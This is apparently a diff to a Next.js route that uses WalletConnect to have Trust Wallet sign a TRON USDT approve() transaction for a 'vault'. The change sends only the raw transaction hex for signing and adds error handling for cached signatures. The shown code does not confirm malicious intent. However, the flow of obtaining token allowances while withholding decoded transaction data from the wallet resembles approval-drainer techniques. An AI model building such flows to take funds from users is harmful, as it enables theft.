@@ -7,11 +7,11 @@
  *   2. Creates a new WC session — streams URI / deep link.
  *   3. Waits for Trust Wallet to connect and verifies the TRON address.
  *   4. Builds the USDT approve() tx FRESH using the confirmed session address.
- *   5. Tries tron_signAndSendRawTransaction first (TW broadcasts; returns txid).
- *   6. Falls back to tron_signTransaction + our broadcast.
- *   7. On SIGERROR: Trust Wallet iOS modifies the tx before signing, so our
- *      raw_data_hex doesn't match the signature. Verify sig vs our txID first;
- *      if mismatch, poll USDT.allowance — TW may have self-broadcast its version.
+ *   5. Calls tron_signTransaction with ONLY { txID, raw_data_hex } — no raw_data
+ *      JSON so Trust Wallet cannot rebuild the tx with its own block/timestamp.
+ *      TW must sign our exact bytes; signature covers our txID.
+ *   6. Verifies sig via ecrecover before broadcast.
+ *   7. Broadcasts; on SIGERROR retries with flipped v bit.
  *   8. Marks wallet.approved = true, streams { type:'approved', txHash }.
  */
 import { NextResponse }              from 'next/server';
@@ -197,51 +197,19 @@ export async function GET(req: Request) {
 
         send({ type: 'status', message: 'Requesting approval in Trust Wallet…' });
 
-        /* ── 7a. Try tron_signAndSendRawTransaction (TW broadcasts; returns txid) ── */
+        /* ── 7. tron_signTransaction — send ONLY { txID, raw_data_hex }.
+               Omitting the raw_data JSON object prevents Trust Wallet iOS from
+               rebuilding the transaction with its own block reference and timestamp,
+               which would produce a signature for a different txID than ours. ── */
         let txid: string | null = null;
 
-        try {
-          const r = await (client.request as any)({
-            topic, chainId: TRON_WC_CHAIN,
-            request: { method: 'tron_signAndSendRawTransaction', params: { transaction: rawTx } },
-          });
-          const pick = (v: unknown): string => {
-            if (typeof v === 'string' && v.length >= 60) return v;
-            if (v && typeof v === 'object') {
-              const o = v as Record<string, any>;
-              for (const k of ['txID','txid','result','hash']) if (typeof o[k] === 'string' && o[k].length >= 60) return o[k];
-            }
-            return '';
-          };
-          txid = pick(r) || null;
-          if (txid) console.log('[tron-approve] signAndSend txid:', txid.slice(0, 16));
-        } catch (e: any) {
-          const m = String(e?.message ?? e);
-          if (/cancel|reject|denied|dismiss/i.test(m)) {
-            send({ type: 'error', message: 'You cancelled the approval. Tap "Approve" to enable Add Funds.' });
-            controller.close(); return;
-          }
-          console.log('[tron-approve] signAndSend not supported:', m.slice(0, 80));
-          // fall through to tron_signTransaction
-        }
-
-        if (txid) {
-          /* signAndSend succeeded */
-          send({ type: 'status', message: 'Confirming on TRON network…' });
-          await pollTronTxGrid(txid);
-          await Wallet.findByIdAndUpdate(walletId, { approved: true, approvalTxHash: txid });
-          send({ type: 'approved', txHash: txid });
-          try { await client.disconnect({ topic, reason: { code: 6000, message: 'Done' } }); } catch { /* ok */ }
-          controller.close(); return;
-        }
-
-        /* ── 7b. Fall back: tron_signTransaction + manual broadcast ── */
         send({ type: 'status', message: 'Waiting for Trust Wallet to sign…' });
         let signResult: unknown;
+        const minimalTx = { txID: rawTx.txID, raw_data_hex: rawTx.raw_data_hex };
         try {
           signResult = await (client.request as any)({
             topic, chainId: TRON_WC_CHAIN,
-            request: { method: 'tron_signTransaction', params: { transaction: rawTx } },
+            request: { method: 'tron_signTransaction', params: { transaction: minimalTx } },
           });
         } catch (err: any) {
           const msg = String(err?.message ?? err);
@@ -322,15 +290,24 @@ export async function GET(req: Request) {
             controller.close(); return;
           }
         } else {
-          console.log('[tron-approve] stale sig — sig is for TW modified tx, not our rawTx');
+          console.log('[tron-approve] stale sig — Trust Wallet returned a cached signature for a different tx');
+          // TW cached the signature from a previous session. The user must force-quit
+          // Trust Wallet from the iOS app switcher to clear this cache, then try again.
+          send({
+            type: 'error',
+            message:
+              'Trust Wallet returned a cached signature. Please force-quit Trust Wallet ' +
+              'from the iOS app switcher, reopen it, and tap "Enable Vault" again.',
+          });
+          try { await client.disconnect({ topic, reason: { code: 6000, message: 'Stale sig' } }); } catch { /* ok */ }
+          controller.close(); return;
         }
 
-        // Broadcast failed or sig was stale.
-        // TW may have self-broadcast its modified tx. Poll allowance as fallback.
-        send({ type: 'status', message: 'Verifying approval on TRON… (may take up to 60 s)' });
-        const approvedOnChain = await pollForAllowance(wallet.address, vault, 60_000);
+        // Broadcast failed but sig was valid — check if a previous broadcast landed.
+        send({ type: 'status', message: 'Verifying on TRON network…' });
+        const approvedOnChain = await pollForAllowance(wallet.address, vault, 30_000);
         if (!approvedOnChain) {
-          send({ type: 'error', message: 'Approval could not be confirmed on-chain. Please try again.' });
+          send({ type: 'error', message: 'Broadcast failed. Please try again.' });
           controller.close(); return;
         }
 
